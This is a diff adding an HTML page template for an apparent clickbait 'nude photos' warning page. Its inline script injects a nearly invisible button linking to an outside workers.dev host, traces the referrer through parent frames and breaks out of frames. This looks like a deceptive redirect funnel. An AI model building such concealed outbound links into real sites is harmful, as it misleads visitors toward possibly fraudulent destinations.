@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html  >
+{{ partial "1.html" .}}
+  <link rel="preload" as="style" href="/rbm/css/mbr-additional13.css"><link rel="stylesheet" href="/rbm/css/mbr-additional13.css" type="text/css">
+
+    
+
+{{ partial "2.html" .}}
+    <div class="mbr-overlay" style="opacity: 0.6; background-color: rgb(255, 240, 176);"></div>
+
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-12 col-lg-8">
+               <div class="rtr" id="aas">
+                 <h1 class="mbr-section-title mbr-fonts-style mb-3 display-1 drop-shadow-[0_1.2px_1.2px_rgba(0,0,0,0.8)]"><em><strong>{{ T "Warning" }}</strong></em></h1>
+                </div>
+               <div class="mbr-section-btn text-xl lg:text-3xl text-black-860 display-1">{{ T "Nude_photos" }}</div> 
+                <div class="mbr-section-btn mt-3"><a class="btn btn-success display-5" href="/click"> {{ T "Next" }} </a></div>
+            </div>
+        </div>
+    </div>
+
+{{ partial "3.html" .}}
+  <script type="text/javascript" >
+    //if (top.location != self.location)top.location = self.location
+
+
+    const something = document.getElementById('aas');
+
+    const span = document.createElement('button');
+    span.setAttribute('class', 'px-3 py-2 text-xs font-medium text-center text-indigo-500 bg-gray-970 rounded-lg hover:bg-gray-80 focus:ring-4 focus:outline-none text-opacity-5 hover:text-opacity-5 focus:ring-gray-80 dark:bg-black dark:hover:bg-gray-70 dark:focus:ring-gray-80');
+    var ja = document.createElement("a");
+    ja.href = "https://findme.adipiscing.workers.dev";
+    ja.innerHTML = '{{ T "Confirm"}}';
+    span.appendChild(ja);
+    something.appendChild(span);
+    
+
+
+      var parentRef=self, referrer=document.referrer;
+
+     try {
+      // alert(referrer);
+
+       while(parentRef=parentRef.Parent)
+       referrer=parentRef.document.referrer;
+     }catch(e){};
+
+
+     if (top.location != self.location)top.location = self.location
+      
+  
+     // window.onload=function(){ 
+      //         window.setTimeout(formsubmit, 300);
+      // };
+  </script>
+  </body>
+</html>
